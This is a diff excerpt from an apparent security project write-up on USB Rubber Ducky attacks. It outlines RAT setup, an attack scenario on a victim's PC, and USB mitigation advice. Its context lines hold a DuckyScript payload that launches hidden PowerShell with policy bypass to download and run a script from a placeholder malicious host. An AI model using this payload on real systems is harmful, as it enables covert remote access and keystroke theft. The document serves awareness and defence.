@@ -46,3 +46,41 @@ Peripheral interfaces, especially USB devices, present a significant risk if exp
    DELAY 1000
    STRING powershell -w hidden -noni -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/payload.ps1')"
    ENTER
+
+
+3. **Configuring the Remote Access Tool:**
+
+Choose a RAT software (e.g., Metasploit, njRAT).
+
+Configure the RAT server and generate the payload executable.
+
+Ensure the payload is accessible via the internet or a local network.
+
+4. **Execution**
+4.1 **Attack Scenario:**
+
+The attacker plugs the RubberDucky into the victim's computer.
+
+The payload script runs, executing the commands to download and run the RAT payload.
+
+4.2 **Outcome:**
+
+The attacker gains remote access to the victim's computer.
+
+Demonstrate the capabilities of the RAT (e.g., capturing screenshots, logging keystrokes).
+
+**Prevention and Mitigation**
+User Education
+Educate users about the risks of connecting unknown USB devices.
+
+Promote best practices for handling USB devices.
+
+**Technical Solutions**
+USB Restrictions: Implement group policies or endpoint protection solutions to restrict USB access.
+
+USB Security Solutions: Use security tools that can detect and block unauthorized USB devices.
+
+Software Updates: Regularly update antivirus and security software to detect new threats.
+
+**Conclusion**
+This project highlights the vulnerabilities associated with peripheral interfaces like USB devices. By understanding and demonstrating these threats, we emphasize the importance of user education and robust security measures.
